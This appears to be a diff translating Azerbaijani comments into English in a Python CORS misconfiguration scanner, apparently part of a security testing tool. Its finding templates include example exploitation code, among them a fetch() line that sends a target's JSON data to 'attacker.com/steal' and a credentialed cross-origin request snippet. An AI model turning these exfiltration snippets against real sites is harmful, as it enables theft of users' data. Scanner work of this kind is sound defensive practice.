@@ -17,8 +17,8 @@ TEST_ORIGINS = [
     "https://evil.com",
     "https://attacker.com",
     "null",
-    "https://{target}",           # Target özü (credentialed check)
-    "https://evil.{target}",      # Subdomain bypass cəhdi
+    "https://{target}",           # The target itself (credentialed check)
+    "https://evil.{target}",      # Subdomain bypass attempt
     "https://{target}.evil.com",  # Suffix bypass
     "https://not{target}",        # Prefix bypass
 ]
@@ -33,7 +33,7 @@ class CORSScanner:
         return f"{ext.domain}.{ext.suffix}"
 
     async def _test_origin(self, url: str, origin: str) -> Optional[dict ]:
-        """Müəyyən origin ilə CORS yoxla"""
+        """Check CORS with a given origin"""
         response = await self.http_client.get(
             url,
             headers={"Origin": origin}
@@ -56,9 +56,9 @@ class CORSScanner:
     async def scan(self, url: str) -> list[Vulnerability]:
         vulns = []
         domain = self._get_domain(url)
-        console.print(f"  [dim]CORS skan: {url[:60]}[/dim]")
+        console.print(f"  [dim]CORS scan: {url[:60]}[/dim]")
 
-        # Wildcard yoxla
+        # Check wildcard
         response = await self.http_client.get(url)
         if response:
             acao = response.headers.get("access-control-allow-origin", "")
@@ -72,25 +72,25 @@ class CORSScanner:
                     cvss_score=5.4,
                     title="CORS Wildcard Origin",
                     description=(
-                        "Access-Control-Allow-Origin: * təyin edilib. "
-                        "İstənilən sayt bu endpoint-ə cross-origin request edə bilər."
+                        "Access-Control-Allow-Origin: * is set. "
+                        "Any site can make a cross-origin request to this endpoint."
                     ),
                     evidence=f"Access-Control-Allow-Origin: *",
                     exploitation=(
-                        "Sensitive data endpoint-i varsa:\n"
+                        "If there's a sensitive data endpoint:\n"
                         "fetch('https://target.com/api/data')\n"
                         "  .then(r => r.json())\n"
                         "  .then(d => fetch('https://attacker.com/steal?d='+JSON.stringify(d)))"
                     ),
                     remediation=(
-                        "Wildcard əvəzinə konkret origin siyahısı tətbiq et:\n"
+                        "Apply a concrete origin list instead of a wildcard:\n"
                         "Access-Control-Allow-Origin: https://yourdomain.com"
                     ),
                     cwe_id="CWE-346",
                     references=["https://portswigger.net/web-security/cors"],
                 ))
 
-        # Origin reflection yoxla
+        # Check origin reflection
         origins_to_test = [
             o.replace("{target}", domain) for o in TEST_ORIGINS
         ]
@@ -103,7 +103,7 @@ class CORSScanner:
             acao = result["acao"]
             has_credentials = result["acac"]
 
-            # Origin reflect olundu?
+            # Was the origin reflected?
             if acao == origin and origin not in ["https://target.com"]:
                 severity = Severity.HIGH if has_credentials else Severity.MEDIUM
                 cvss = 8.1 if has_credentials else 6.5
@@ -115,8 +115,8 @@ class CORSScanner:
                     cvss_score=cvss,
                     title=f"CORS Arbitrary Origin Reflection{'+ Credentials' if has_credentials else ''}",
                     description=(
-                        f"Server göndərilən Origin-i ({origin}) olduğu kimi reflect edir. "
-                        f"{'Allow-Credentials: true ilə birlikdə bu kritik data theft-ə imkan verir.' if has_credentials else ''}"
+                        f"The server reflects the sent Origin ({origin}) back as-is. "
+                        f"{'Combined with Allow-Credentials: true, this allows critical data theft.' if has_credentials else ''}"
                     ),
                     evidence=(
                         f"Request Origin: {origin}\n"
@@ -124,7 +124,7 @@ class CORSScanner:
                         f"Allow-Credentials: {result['acac']}"
                     ),
                     exploitation=(
-                        f"Attacker saytından:\n\n"
+                        f"From an attacker's site:\n\n"
                         f"var req = new XMLHttpRequest();\n"
                         f"req.open('GET', '{url}', true);\n"
                         f"{'req.withCredentials = true;' + chr(10) if has_credentials else ''}"
@@ -134,8 +134,8 @@ class CORSScanner:
                         f"req.send();"
                     ),
                     remediation=(
-                        "1. Origin whitelist yaradın — dinamik reflection etmə\n"
-                        "2. Credentials istifadə edirsənsə wildcard/arbitrary origin qadağan et\n"
+                        "1. Create an origin whitelist — don't reflect dynamically\n"
+                        "2. If using credentials, disallow wildcard/arbitrary origin\n"
                         "3. Add Vary: Origin header for cache poisoning"
                     ),
                     curl_poc=(
@@ -146,6 +146,6 @@ class CORSScanner:
                 )
                 vulns.append(vuln)
                 console.print(f"  {vuln.severity.emoji} [bold]CORS:[/bold] {origin} → reflected {'+ credentials' if has_credentials else ''}")
-                break  # Bir tapanda kifayət
+                break  # Stop once one is found
 
         return vulns
